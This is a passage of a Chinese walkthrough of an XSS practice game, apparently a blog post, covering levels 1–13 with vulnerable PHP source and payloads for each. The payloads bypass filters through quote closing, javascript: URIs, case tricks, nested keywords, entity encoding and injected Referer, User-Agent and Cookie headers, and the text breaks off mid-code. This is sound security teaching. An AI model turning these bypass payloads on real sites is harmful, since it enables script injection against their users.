+<p><code>message</code>和<code>name</code>变量都进行了严格的过滤，而且还检测了用户的token：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure>
+<p>有效地防止了CSRF的攻击</p>
+<h1 id="XSS小游戏习题讲解"><a href="#XSS小游戏习题讲解" class="headerlink" title="XSS小游戏习题讲解"></a>XSS小游戏习题讲解</h1><h2 id="第1关-无任何过滤措施"><a href="#第1关-无任何过滤措施" class="headerlink" title="第1关 无任何过滤措施"></a>第1关 无任何过滤措施</h2><p><strong>源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户:"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>name变量通过<strong>GET</strong>方式传入，直接带入到<code>&lt;h2&gt;</code>标签中，没有任何过滤。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/level1.php?name=&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="第2关-闭合双引号"><a href="#第2关-闭合双引号" class="headerlink" title="第2关 闭合双引号"></a>第2关 闭合双引号</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>keyword变量通过<strong>GET</strong>方式传入，赋值给<code>$str</code>变量，然后带入到<code>&lt;h2&gt;</code>标签中和<code>&lt;input&gt;</code>标签。 <code>&lt;h2&gt;</code>标签经过了<code>htmlspecialchars($str)</code>编码，<code>&lt;input&gt;</code>标签没有任何过滤，所以尝试在<code>&lt;input&gt;</code>标签中闭合双引号<code>&quot;</code>，来触发事件。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure>
+<h2 id="第3关-闭合单引号"><a href="#第3关-闭合单引号" class="headerlink" title="第3关 闭合单引号"></a>第3关 闭合单引号</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>keyword变量通过<strong>GET</strong>方式传入，赋值给<code>$str</code>变量，然后带入到<code>&lt;h2&gt;</code>标签中和<code>&lt;input&gt;</code>标签。 <code>&lt;h2&gt;</code>标签经过了<code>htmlspecialchars($str)</code>编码，<code>&lt;input&gt;</code>标签没有任何过滤，所以尝试在<code>&lt;input&gt;</code>标签中闭合单引号<code>&#39;</code>，来触发事件。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure>
+<h2 id="第4关-闭合双引号"><a href="#第4关-闭合双引号" class="headerlink" title="第4关 闭合双引号"></a>第4关 闭合双引号</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level4.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str3.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在第2关的基础上，过滤了尖括号，但是直接在<code>&lt;input&gt;</code>标签中构造闭合双引号来构造事件来触发并用不到引号，所以第2关的payload依然适用。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure>
+<h2 id="第5关-javascript妙用"><a href="#第5关-javascript妙用" class="headerlink" title="第5关 javascript妙用"></a>第5关 javascript妙用</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level5.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str3.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>首先对keyword变量使用了<code>strtolower()</code>函数转换，把所有字符转换为小写；接着过滤了<code>&lt;script</code>，并替换为<code>&lt;scr_ipt</code>；过滤了<code>on</code>并替换为<code>o_n</code>。因为<code>on</code>是很多事件都包含的关键词，所以这里无法直接通过闭合引号在<code>&lt;input&gt;</code>标签中来触发弹窗了，这个可以闭合双引号和标签，然后通过<code>javascript:alert(&#39;XSS&#39;)</code>这种形式来触发弹窗。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure>
+<h2 id="第6关-大小写转换"><a href="#第6关-大小写转换" class="headerlink" title="第6关 大小写转换"></a>第6关 大小写转换</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level6.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>比第5关加入了很多的过滤规则，而且过滤了<code>href</code>属性，这样就无法使用<code>javascript:alert()</code>这种形势来弹窗了，但是仔细观察源码，这里少了第5关的<code>strtolower()</code>函数，所以这里可以通过大小写转换来绕过过滤。</p>
+<p><strong>payload1</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; Onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure>
+<p><strong>payload2</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a Href=javascript:alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure>
+<h2 id="第7关-嵌套构造"><a href="#第7关-嵌套构造" class="headerlink" title="第7关 嵌套构造"></a>第7关 嵌套构造</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str =strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level7.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在第6关的基础上，首先还统一使用了<code>strtolower()</code>函数，将keyword变量的值转换了小写，这样就无法直接使用大小写转换的思路来绕过了。但是这里的过滤比较巧妙，是直接将敏感字符替换为空（即删掉了），这种机制我们可以尝试使用嵌套构造payload来绕过。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; oonnclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure>
+<h2 id="第8关-HTML编码"><a href="#第8关-HTML编码" class="headerlink" title="第8关 HTML编码"></a>第8关 HTML编码</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br><span class="line">echo &apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level8.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里的过滤规则很完善，基本上都过滤掉了可能触发弹窗的一些字符串。同时有2个输出，一个输出在了<code>&lt;input&gt;</code>标签中，并且通过<code>htmlspecialchars($str)</code>函数实体化后输出来，这里基本上是凉凉了。看第2个输出，是在<code>&lt;a&gt;</code>标签中，而且没有过滤，直接输出在了双引号<code>&quot;</code>之间，当作字符串处理，利用当作字符串处理的特点，可以直接将我们的payload HTML使用HTML实体字符编码绕过，有因为直接输出在了<code>href</code>的属性里面，所以可以尝试<code>javascript()</code>这种形式来触发弹窗。</p>
+<p>j将<code>t</code>编码为<code>t</code></p>
+<p><strong>payload1</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#x74;:alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure>
+<p>也可以将<code>Tab键</code>编码为<code>插入到关键词中绕过过滤；同理也可以将`回车键`编码为</code>插入来Bypass</p>
+<p><strong>payload2</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#x09;t:alert(&apos;XSS&apos;) //</span><br><span class="line">javascrip&amp;#x0a;t:alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure>
+<h2 id="第9关-阅读源码"><a href="#第9关-阅读源码" class="headerlink" title="第9关 阅读源码"></a>第9关 阅读源码</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br><span class="line">echo &apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&apos;http://&apos;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里只是比第8关多了到对提交的keyword里面是否有<code>http://</code>的检测，所以Bypass的话就很简单，直接在第8关的payload后面添加：<code>http://</code></p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#x74;:alert(&apos;XSS&apos;) //http://</span><br></pre></td></tr></table></figure>
+<h2 id="第10关-覆盖元素属性"><a href="#第10关-覆盖元素属性" class="headerlink" title="第10关 覆盖元素属性"></a>第10关 覆盖元素属性</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看出这里keyword变量依然没戏，被HTML实体化输出了出来，所以重点放在<code>t_sort</code>变量上，只过滤了尖括号，然后就直接输出到了<code>&lt;input&gt;</code>标签中，所以这里可以尝试直接在标签中闭合构造事件来弹窗，还得注意一点就是这里的<code>&lt;input&gt;</code>标签使用了<code>type=&quot;hidden&quot;</code>将输入框隐藏了起来，可以手动赋值<code>type</code>的值来覆盖掉先前的属性来达到显示文本框的目的。</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level10.php?keyword=233&amp;t_sort=&quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure>
+<h2 id="第11关-HTTP-Referer"><a href="#第11关-HTTP-Referer" class="headerlink" title="第11关 HTTP Referer"></a>第11关 HTTP Referer</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>看变量的输出基本上可以判定<code>$str</code>和<code>$str00</code>变量没戏，也就是我们可以控制的<code>keyword</code>和<code>t_sort</code>变量是无法突破限制来弹窗的。观察<code>$str33</code>是通过<code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];</code>过滤了尖括号然后赋值的，那么尝试在HTTP请求头的<code>Referer</code>构造payload。</p>
+<p>使用<code>hackbar</code>或者<code>BurpSuite</code>可以很方便地改写HTTP请求头地<code>Referer</code>字段：</p>
+<p><img src="http://qiniuyun.lintstar.top/1555499820467.png" alt="1555499820467"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure>
+<h2 id="第12关-HTTP-User-Agent"><a href="#第12关-HTTP-User-Agent" class="headerlink" title="第12关 HTTP User-Agent"></a>第12关 HTTP User-Agent</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ua&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这一题和上一题类似，只是这里的漏洞点出现在了HTTP请求头的<code>User-Agent</code>。</p>
+<p>使用<code>hackbar</code>或者<code>BurpSuite</code>可以很方便地改写HTTP请求头地<code>User-Agent</code>字段：</p>
+<p><img src="http://qiniuyun.lintstar.top/1555500203323.png" alt="1555500203323"></p>
+<p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure>
+<h2 id="第13关-HTTP-Cookie"><a href="#第13关-HTTP-Cookie" class="headerlink" title="第13关 HTTP Cookie"></a>第13关 HTTP Cookie</h2><p><strong>源码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_COOKIE[&quot;user&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 